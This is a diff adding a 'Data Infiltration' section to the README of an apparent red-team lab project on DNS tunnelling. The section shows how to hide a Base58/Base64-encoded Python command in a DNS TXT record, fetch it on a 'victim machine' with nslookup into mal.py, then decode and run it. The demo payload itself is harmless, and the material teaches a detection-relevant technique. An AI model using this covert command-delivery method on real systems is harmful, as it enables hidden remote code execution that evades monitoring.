@@ -31,3 +31,41 @@ python3 packetyGrabber.py
 The script will then Base58 Decode it, then Base64 Decode it. You will now have the goodies.txt file to look at and it should contain all the content that was in the securecorp.txt file. You have successfully exfiltrated the data using DNS
 
 
+## Data Infiltration
+We want to simulate a C2-like activity of sending an encoded command to run on a victim machine. The scenario here would be that the attacker has compromised a victim machine, and has a domain/dns that has encoded commands they want to be sent to this machine without being caught as normal C2 traffic would. 
+First you want to create a domain, I would recommend using Google Domains to register a new domain. For this example, we will use wingnut.com. We are still in the directory of the github project we used in the above example as well. In this example our "malicious" command will be:
+
+```
+import os; print(os.uname()[2])
+```
+Log into your Google Domains and manage the DNS for wingnut.com. Make a new Custom Record of type TXT, and give it a name of badstuff. Next give it a value of 
+YeeTbunLbACdXq193g6VHXRuDQ9Y1upaAzA3UkpCr8yBBE68JEXU32wxNE44
+This is a Base58/Base64 encoded version of that "malicious" command. Save it then to test it bring up command prompt and type:
+
+```
+nslookup -type=txt badstuff.wingnut.com
+```
+You should see that long encoded value. So on the victim machine in the directory of the github we have been using, do this command:
+
+```
+nslookup -type=txt badstuff.wingnut.com | grep Ye | cut -d \" -f2 > mal.py
+```
+This should pull that string value and put it in a file called mal.py. Next we run the script:
+
+```
+python3 packetySimple.py 
+```
+1. First it asks for the filename
+2. Put in mal.py and hit enter
+
+This will do the proper decode, and now you should be able to run
+
+```
+python3 mal.py
+```
+and it should run that OS command
+
+
+
+
+
